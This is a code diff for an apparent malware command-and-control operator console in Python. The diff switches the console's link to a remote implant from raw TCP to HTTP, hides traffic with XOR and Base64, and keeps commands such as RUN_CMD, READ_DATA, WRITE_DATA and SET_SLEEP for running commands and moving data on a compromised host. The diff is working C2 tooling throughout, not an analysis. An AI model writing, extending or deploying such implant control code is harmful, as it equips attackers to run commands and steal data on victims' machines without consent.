@@ -1,10 +1,10 @@
-#!/usr/bin/env python3
-
-import socket
 import json
 import base64
 import sys
 import argparse
+
+import requests
+from requests.exceptions import ConnectionError, Timeout, HTTPError
 
 try:
     from rich.console import Console
@@ -24,57 +24,61 @@ try:
 except ImportError:
     _PT = False
 
-
 XOR_KEY = b'keyed_up'
 
 def _xor(data):
     k = len(XOR_KEY)
     return bytes([b ^ XOR_KEY[i % k] for i, b in enumerate(data)])
 
-def encode(msg):
+def encode(msg) -> bytes:
+    """JSON → XOR → Base64."""
     return base64.b64encode(_xor(json.dumps(msg).encode()))
 
-def decode(data):
+def decode(data: bytes) -> dict:
+    """Base64 → XOR → JSON."""
     return json.loads(_xor(base64.b64decode(data)).decode())
 
-
 class ImplantConn:
-    def __init__(self, host, port):
-        self.host  = host
-        self.port  = port
-        self._sock = None
-        self._req  = 1
+    """
+    Sends encoded commands to the implant over HTTP POST.
+
+    Every request:
+      POST <base_url>/command
+      Content-Type: application/octet-stream
+      Body: Base64(XOR(JSON(message)))
+
+    Every response:
+      Body: Base64(XOR(JSON(response)))
+    """
+
+    def __init__(self, host: str, port: int, timeout: int = 10):
+        scheme = "http" if not host.startswith("http") else ""
+        self.base_url = f"{scheme}{'://' if scheme else ''}{host}:{port}"
+        self.timeout  = timeout
+        self._req     = 1
+        self._session = requests.Session()
+        self._session.headers.update({"Content-Type": "application/octet-stream"})
 
     def connect(self):
-        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self._sock.connect((self.host, self.port))
+        """Verify the implant is reachable via GET /ping."""
+        url = f"{self.base_url}/ping"
+        resp = self._session.get(url, timeout=self.timeout)
+        resp.raise_for_status()
 
     def close(self):
-        if self._sock:
-            self._sock.close()
-            self._sock = None
+        self._session.close()
 
-    def send(self, cmd_type, payload):
+    def send(self, cmd_type: str, payload: dict) -> dict:
+        """Encode a command, POST it, decode and return the response."""
         msg  = {"type": cmd_type, "request_id": self._req, "payload": payload}
-        data = encode(msg)
-        self._sock.sendall(len(data).to_bytes(4, "big") + data)
+        body = encode(msg)
         self._req += 1
-        return self._recv()
 
-    def _recv(self):
-        raw = self._recv_n(4)
-        n   = int.from_bytes(raw, "big")
-        return decode(self._recv_n(n))
+        url  = f"{self.base_url}/command"
+        resp = self._session.post(url, data=body, timeout=self.timeout)
+        resp.raise_for_status()
 
-    def _recv_n(self, n):
-        buf = b""
-        while len(buf) < n:
-            chunk = self._sock.recv(n - len(buf))
-            if not chunk:
-                raise ConnectionError("Implant closed the connection")
-            buf += chunk
-        return buf
-
+        return decode(resp.content)
 
 def print_response(resp):
     text = json.dumps(resp, indent=2)
@@ -97,7 +101,6 @@ def info(msg):
     if _RICH: console.print(f"[*] {msg}", style="bold cyan")
     else: print(f"[*] {msg}")
 
-
 COMMANDS = ["HELLO","SHUTDOWN","SET_SLEEP","READ_DATA","WRITE_DATA","RUN_CMD",
             "help","exit","quit"]
 
@@ -118,15 +121,15 @@ BANNER = r"""
  ██║     ██╔═══╝     ██║     ██║     ██║
  ╚██████╗███████╗    ╚██████╗███████╗██║
   ╚═════╝╚══════╝     ╚═════╝╚══════╝╚═╝
-   Operator CLI  |  XOR/b64 TCP implant
+   Operator CLI  |  XOR/b64 HTTP implant
 """
 
 
-def run_repl(conn):
+def run_repl(conn: ImplantConn):
     if _RICH: console.print(BANNER, style="bold cyan")
     else: print(BANNER)
 
-    info(f"Connected to implant at {conn.host}:{conn.port}")
+    info(f"Connected to implant at {conn.base_url}")
     info("Type 'help' for commands\n")
 
     if _PT:
@@ -157,6 +160,7 @@ def run_repl(conn):
         if cmd == "HELP":
             print(HELP_TEXT); continue
 
+        # ── Build payload per command ──────────────
         if cmd == "HELLO":
             payload = {}
         elif cmd == "SHUTDOWN":
@@ -176,11 +180,14 @@ def run_repl(conn):
         else:
             err(f"Unknown command: '{cmd}'. Type 'help'."); continue
 
+        # ── Send over HTTP ─────────────────────────
         try:
             resp = conn.send(cmd, payload)
             print_response(resp)
-        except ConnectionError as exc:
+        except (ConnectionError, Timeout) as exc:
             err(f"Lost connection: {exc}"); break
+        except HTTPError as exc:
+            err(f"HTTP error from implant: {exc}"); continue
         except Exception as exc:
             err(f"Error: {exc}"); continue
 
@@ -190,18 +197,20 @@ def run_repl(conn):
     conn.close()
     info("Disconnected.")
 
-
 def main():
-    parser = argparse.ArgumentParser(description="Operator CLI")
-    parser.add_argument("host")
-    parser.add_argument("port", nargs="?", type=int, default=4444)
+    parser = argparse.ArgumentParser(description="Operator CLI (HTTP)")
+    parser.add_argument("host", help="Implant host (e.g. 127.0.0.1 or http://192.168.1.5)")
+    parser.add_argument("port", nargs="?", type=int, default=8080,
+                        help="Implant HTTP port (default: 8080)")
+    parser.add_argument("--timeout", type=int, default=10,
+                        help="Request timeout in seconds (default: 10)")
     a = parser.parse_args()
 
-    conn = ImplantConn(a.host, a.port)
+    conn = ImplantConn(a.host, a.port, timeout=a.timeout)
     try:
         conn.connect()
     except Exception as exc:
-        err(f"Cannot connect to {a.host}:{a.port} — {exc}")
+        err(f"Cannot reach implant at {conn.base_url} — {exc}")
         sys.exit(1)
 
     run_repl(conn)
